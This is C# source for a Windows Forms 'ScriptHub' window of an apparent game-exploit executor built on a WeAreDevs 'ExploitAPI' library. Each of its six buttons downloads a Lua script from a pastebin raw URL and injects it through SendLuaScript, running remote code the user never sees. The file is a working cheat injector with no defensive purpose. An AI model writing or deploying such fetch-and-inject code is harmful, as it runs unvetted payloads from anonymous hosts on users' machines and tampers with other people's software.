using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace H_Executor
{
    public partial class ScriptHub : Form
    {
        WeAreDevs_API.ExploitAPI H_Executor = new WeAreDevs_API.ExploitAPI();
        public ScriptHub()
        {
            InitializeComponent();
        }

        private void ScriptHub_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/bj4JwH8m");
            H_Executor.SendLuaScript(Script);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/GUPbP0zN");
            H_Executor.SendLuaScript(Script);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/66dzdkHY");
            H_Executor.SendLuaScript(Script);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/906aze39");
            H_Executor.SendLuaScript(Script);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/t6HK6hGt");
            H_Executor.SendLuaScript(Script);
        }

        private void button6_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/0NVAwT3E");
            H_Executor.SendLuaScript(Script);
        }
    }
}
